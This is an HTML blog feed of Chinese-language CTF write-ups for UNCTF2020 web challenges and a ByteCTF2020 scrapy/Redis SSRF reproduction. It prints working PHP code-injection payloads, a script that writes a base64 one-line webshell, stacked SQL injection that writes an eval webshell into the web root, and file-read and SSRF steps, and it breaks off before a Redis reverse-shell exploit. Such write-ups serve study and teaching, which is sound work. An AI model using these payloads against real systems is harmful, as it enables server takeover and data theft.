php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量名必须是<code>var1</code>或者<code>var12</code>这种形式，而且在变量覆盖环节转义了单双引号。</p><p>关于复杂变量的解析：<a href="https://ca0y1h.top/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/">https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/</a></p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1=&#123;$_GET[<span class="number">1</span>]&#125;&amp;var3=$&#123;$var1()&#125;&amp;<span class="number">1</span>=phpinfo</span><br></pre></td></tr></table></figure><p>解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure><h2 id="L0vePHP">L0vePHP</h2><p>查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。</p><p>解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>, $action)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hint用十六进制转码<code>1nD3x.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>);</span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>预期解，利用PHP5.6新引入的特性——变长参数</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assert</span><br><span class="line">POST</span><br><span class="line">code&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure><p>也就是相当于执行了<code>usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert);</code></p><p>P年的那篇文章还提到了可以利用文件包含写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>用脚本自动跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = <span class="string">&quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;</span>.format(s)</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="comment"># print(res.status_code)</span></span><br></pre></td></tr></table></figure><p>base64编码后的一句话已经写入了A文件，再文件包含这个A文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201118212038.png" alt=""></p><h2 id="俄罗斯方块">俄罗斯方块</h2><p>题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117220752.png" alt=""></p><p>拼接一下文件名下载下来解压之后拿到<code>blocks.wasm</code>，再用wabt工具集中的wasm2wat对其进行反编译</p><blockquote><p><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p><p><a href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html">https://webassembly.github.io/wabt/doc/wasm2wat.1.html</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221818.png" alt=""></p><p>反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221631.png" alt=""></p><p>再修改这个分数，最后编译成wasm文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221929.png" alt=""></p><p>把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117231202.png" alt=""></p><h2 id="ezphp">ezphp</h2><p>题目这样出我真的。。。。没想到</p><p>并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">True</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">True</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>POST参数即可得到flag</p><h2 id="checkin-sql">checkin-sql</h2><p>强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。</p><p>堆叠注入查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;show tables;</span><br></pre></td></tr></table></figure><p>查表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;desc 0xDktb;</span><br></pre></td></tr></table></figure><p>用预处理和十六进制编码<code>select * from 0xDktb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql;</span><br></pre></td></tr></table></figure><p>发现被过滤掉了<code>set</code>关键字。（在比赛的时候没想到可以直接不要set语句。。。</p><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;</span><br></pre></td></tr></table></figure><p>发现可以执行成功，那么直接写shell<code>select '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;</span><br></pre></td></tr></table></figure><p>用蚁剑连接拿flag。</p><h2 id="赛后收获">赛后收获</h2><ul><li>flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过；</li><li><code>is_file()</code>函数的参数是一个数组的时候会返回一个NULL；</li><li>.htaccess可以用换行的方式绕过关键字黑名单</li><li>接上一条，如果过滤了<code>\</code>，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag；</li><li>PHP复杂变量解析；</li><li>PHP5.6以后版本有变长参数的特性；</li><li>在代码注入的题目中还可以用这种方式写入shell：<code>$_GET[a](N,a,8);&amp;a=file_put_contents</code>，再用PHP伪协议读取；</li><li>SQL注入预编译过了<code>set</code>，可以直接用<code>prepare execsql from 0x....</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;UNCTF2020-Web-wp&quot;&gt;UNCTF2020 Web wp&lt;/h1&gt;
&lt;h2 id=&quot;easyssrf-solved&quot;&gt;easyssrf [solved]&lt;/h2&gt;
&lt;p&gt;算是签到题，比较easy&lt;/p&gt;
&lt;figure class=&quot;highlight
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2020-scrapy_redis复现</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-11-05T15:30:44.000Z</published>
    <updated>2020-11-05T15:32:20.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2020复现">ByteCTF2020复现</h1><p>这web题目出的简直就是神仙。。</p><h2 id="easy-scrapy">easy_scrapy</h2><p>首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位，可以直接写Python脚本爆破。添加数据的时候，在VPS监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102143549.png" alt=""></p><p>从上图中可以看出使用的是scrapy+redis，应该是url数据会存储在Redis中，然后用scrapy爬虫爬取。</p><p>添加完数据后，在MyUrlList中会显示数据，点击记录，发现会访问<code>http://101.200.50.18:30010/result?url=http://xx.xx.xxx.xx:8888/</code>，可能存在SSRF，监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102141039.png" alt=""></p><p>后面<code>/result?url</code>则是用了另一种功能进行pycurl的请求，类似于<code>curl</code>，同样支持使用Gopher协议。</p><p>复现时候也用SSRF常见利用方式探测端口以及Redis的服务信息，但是没有什么收获。</p><p>转变一下思路，既然是爬虫，那么遇到<code>&lt;a&gt;</code>标签，他就有可能去请求：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104155454.png" alt=""></p><p>既然是这样，那么就可以把<code>&lt;a&gt;</code>标签的href改成file协议造成任意文件读取：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104162527.png" alt=""></p><p>OK，验证成功。那么这样的话，就可以读取题目的爬虫源码，但是在读之前，需要知道爬虫源码的绝对路径。可以通过读取<code>/etc/self/environ</code>得到工作路径</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104170859.png" alt=""></p><p>显示当前<code>PWD=/code</code>，但是我们还不知道项目结构，可以去<a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html">官方文档</a>中找到这个爬虫框架的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tutorial&#x2F;</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    tutorial&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders&#x2F;</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>这些文件分别是:</p><ul><li><code>scrapy.cfg</code>: 项目的配置文件</li><li><code>tutorial/</code>: 该项目的python模块。之后您将在此加入代码。</li><li><code>tutorial/items.py</code>: 项目中的item文件.</li><li><code>tutorial/pipelines.py</code>: 项目中的pipelines文件.</li><li><code>tutorial/settings.py</code>: 项目的设置文件.</li><li><code>tutorial/spiders/</code>: 放置spider代码的目录.</li></ul><p>首先去看项目配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure><p>得知项目名是<code>bytectf</code>，但是还需要知道<code>bytectf</code>文件夹下的<code>spiders</code>的爬虫文件名。</p><p>读取<code>/proc/self/cmdline</code>，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br></pre></td></tr></table></figure><p>那么当前的爬虫名字是byte。</p><p>读取源码，得到结构如下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104172101.png" alt=""></p><p>通过piplelines.py和settings.py分别得到了MongoDB和Redis的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">&#x27;bytectf&#x27;</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;bytectf.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;bytectf.spiders&#x27;</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;scrapy_redis&#x27;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">REDIS_HOST = <span class="string">&#x27;172.20.0.7&#x27;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及主要的爬虫逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>到这里，我用<a href="https://bycsec.top/">byc404</a>写好的docker-compose在本地起爬虫，跟线上的bot+redis+mongo环境基本一致。</p><blockquote><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p></blockquote><blockquote><p>Github上的环境缺一个文件，需要在<code>easyscrapy/python/bytectf/spiders</code>加一个<code>__init__.py</code>文件。不然scrapy会报没有spiders库。</p></blockquote><p>三个containers启动了之后可以看到爬虫服务已经start了。Redis在本机也映射到了6379端口，进入Redis容器可以看到现在没有keys：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105194319.png" alt=""></p><p><a href="http://xn--fill-z94fz69b9j1ahda5675ayyp.py">在本机上运行fill.py</a>，需要提前安装<code>https://github.com/wuchengwei0122/redis-py.git</code></p><p>相当于向Redis循环200次添加<code>start_urls:http//baidu.com</code>，这个时候就可以看到<code>byte:requests</code>键存在序列化数据：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105202111.png" alt=""></p><p>那么利用链就是想办法写入<code>byte:requests</code>键，内容为序列化数据，而写入的方法就是pycurl的SSRF，利用Gopher协议打Redis。</p><p>贴一个官方的exp，用python3生成poc，反弹shell：</p><blockquote><p>由于<code>byte:requests</code>有序列表是zset，需要在Redis上执行ZADD命令。</p></blockquote><figure class="highlight python"><table><tr><td 